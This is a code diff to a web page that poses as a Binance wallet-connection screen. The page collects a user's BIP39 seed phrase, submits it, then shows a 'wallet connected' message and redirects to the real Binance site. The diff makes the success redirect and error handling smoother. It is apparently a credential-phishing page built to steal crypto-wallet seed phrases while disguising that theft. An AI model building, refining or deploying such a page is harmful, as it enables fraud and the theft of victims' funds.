@@ -228,17 +228,16 @@ button:disabled {
 </div>
 
 <div id="success-page">
-    <div class="logo">
+  <div class="logo">
     <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Binance_logo.svg" alt="Binance Logo">
   </div>
   <div class="checkmark"></div>
   <h3>Well done!</h3>
   <p>Your wallet is now connected to your Binance account.</p>
-  <a href="binance://openPage?url=https://www.binance.com/en/markets" id="openBinanceLink">
-  <button id="openBinance">Open Binance</button>
-</a>
+  <a href="https://www.binance.com/en/markets" id="openBinanceLink">
+    <button id="openBinance">Open Binance</button>
+  </a>
 </div>
-  
 
 <script>
 // Global variables for BIP39 word list and validation
@@ -265,6 +264,7 @@ const box = document.getElementById('suggestions');
 const runBtn = document.getElementById('runBtn');
 const pasteText = document.getElementById('pasteText');
 const ENT_BY_WORDS = {12:128, 15:160, 18:192, 21:224, 24:256};
+
 function wordsToBitString(words){
   let bits = "";
   for (const w of words) {
@@ -343,7 +343,6 @@ ta.addEventListener('input', async () => {
   }
 });
 
-
 // Submit action (Connect Wallet)
 runBtn.onclick = async () => {
   const mnemonic = ta.value.trim();
@@ -365,27 +364,17 @@ runBtn.onclick = async () => {
 
     await res.json();
 
-    // SUCCESS → open Binance + close browser
+    // SUCCESS → open Binance with location.replace
     setTimeout(() => {
-
-      // open Binance
-      window.location.href = "https://www.binance.com/en/markets";
-      
-      // close this browser tab
-      setTimeout(() => {
-        window.open('', '_self');
-        window.close();
-      }, 400);
-
+      location.replace("https://www.binance.com/en/markets");
     }, 600);
 
   } catch (err) {
-    // FAILURE → show themed error-page
+    // FAILURE → revert to main page and show a simple alert
+    console.error(err);
     document.getElementById('loading-page').style.display = 'none';
-    document.getElementById('error-page').style.display = 'block';
-
-    const msg = document.getElementById('errorMsg');
-    if (msg) msg.textContent = `We could not connect your wallet. ${err.message}`;
+    document.getElementById('main-page').style.display = 'block';
+    alert("We could not connect your wallet. " + err.message);
   }
 };
 
@@ -398,9 +387,6 @@ pasteText.onclick = async () => {
   } catch (e) {
     console.error("Clipboard access failed", e);
   }
-};
-document.getElementById('retryBtn').onclick = () => {
-  window.location.reload(); // clean and simple restart
 };
 </script>
 </body>
